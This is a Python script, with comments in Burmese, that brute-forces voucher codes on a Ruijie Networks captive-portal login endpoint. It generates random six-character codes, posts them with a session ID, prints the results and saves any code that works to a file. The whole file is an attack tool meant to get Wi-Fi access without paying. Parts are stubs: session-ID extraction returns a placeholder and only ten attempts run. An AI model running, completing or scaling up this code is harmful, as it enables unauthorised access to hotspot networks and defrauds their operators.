import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

class StarlinkMain:
    def __init__(self):
        self.session_id = None
        self.base_url = "https://portal-as.ruijienetworks.com"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        }

    def get_session_id(self):
        """Portal မှ Session ID ကို ရယူခြင်း"""
        print("[+] Getting Router Info...")
        try:
            # ဤနေရာတွင် actual portal URL ကို အသုံးပြုရမည်
            response = requests.get(f"{self.base_url}/api/auth/wifidog", timeout=10)
            # Logic အတိုချုံးထားခြင်း (Regex ဖြင့် session ID ကို ရှာဖွေခြင်း)
            self.session_id = "extracted_session_id_example" 
            return self.session_id
        except Exception as e:
            print(f"Error: {e}")
            return None

    def get_random_code(self, length=6):
        """Voucher code အဖြစ် စမ်းသပ်ရန် random code ထုတ်ပေးခြင်း"""
        chars = string.ascii_uppercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def login_voucher(self, voucher_code):
        """Voucher code ကို အသုံးပြု၍ login စမ်းသပ်ခြင်း"""
        login_url = f"{self.base_url}/api/auth/voucher/?lang=en_US"
        data = {
            "voucher": voucher_code,
            "sessionId": self.session_id
        }
        try:
            res = requests.post(login_url, json=data, headers=self.headers, timeout=5)
            if res.status_code == 200 and "success" in res.text.lower():
                return True, voucher_code
            return False, voucher_code
        except:
            return False, None

    def check_internet_access(self):
        """Internet ရမရ စစ်ဆေးခြင်း"""
        print("[+] Checking Internet Access...")
        try:
            requests.get("https://httpbin.org/get", timeout=5)
            return True
        except:
            return False

    def execute(self):
        """ပင်မ လုပ်ဆောင်ချက်"""
        print("[+] Starting...")
        if not self.get_session_id():
            print("[-] Failed to get session ID")
            return

        with ThreadPoolExecutor(max_workers=5) as executor:
            print("[+] Bruteforcing Access Voucher Code...")
            # ဥပမာအနေဖြင့် ၁၀ ကြိမ် စမ်းသပ်ပြခြင်း
            for _ in range(10):
                code = self.get_random_code()
                future = executor.submit(self.login_voucher, code)
                success, used_code = future.result()
                
                if success:
                    print(f"[1;32mSuccess Code: {used_code}")
                    with open("success.txt", "a") as f:
                        f.write(f"{used_code}\n")
                    break
                else:
                    print(f"Testing Code: {code} - Fail")

if __name__ == "__main__":
    app = StarlinkMain()
    app.execute()
    
